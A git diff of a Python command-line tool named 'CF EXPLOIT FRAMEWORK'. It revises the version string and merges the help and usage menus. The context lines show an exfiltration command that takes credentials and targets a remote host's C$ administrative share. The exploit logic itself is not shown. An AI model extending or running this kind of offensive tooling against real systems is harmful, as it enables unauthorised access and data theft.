@@ -20,7 +20,7 @@ except ImportError as e:
     input()
     sys.exit(0)
 
-VERSION = "CF EXPLOIT FRAMEWORK RC1"
+VERSION = "CF EXPLOIT FRAMEWORK v1"
 BANNER = r'''
   /$$$$$$  /$$$$$$$$ /$$$$$$$$
  /$$__  $$| $$_____/| $$_____/
@@ -349,22 +349,14 @@ def menu():
     for line in BANNER:
         print(line, end="")
     print("\n" + VERSION)
-    print("\n[!] Type 'help' to see available commands, and 'usage' for syntax")
+    print("\n[!] Type 'help' to see available commands")
 
     while True:
         cmd = input("\n> ").split(" ")
         if cmd[0] == "help":
-            print("\n[!] Available commands are:\n")
+            print("\n[!] Available commands are")
             for command in validCommands:
-                print("%s :: %s" % (command, validCommands[command][0]))
-            print("\n[!] Type 'usage' for info on how to run the commands\n")
-            beep()
-
-        if cmd[0] == "usage":
-            print("\n[!] Usage is as follows:\n")
-            for command in validCommands:
-                print("%s :: %s" % (command, validCommands[command][1]))
-            print("")
+                print("|\n|__[+] %s\n| |\n| |__%s\n|    |__%s" % (command, validCommands[command][0], validCommands[command][1]))
             beep()
 
         if cmd[0] == "getcmd":
@@ -499,7 +491,7 @@ def menu():
                 creds = cmd[2].split(":")
                 exfil(cmd[1], "C$\\ProgramData\\Microsoft\\Windows",creds[0], creds[1])
             else:
-                print("Incorrect usage: see \"usage\" command")
+                print("Incorrect usage: see \"help\" command")
 
 
 def getintel(host):
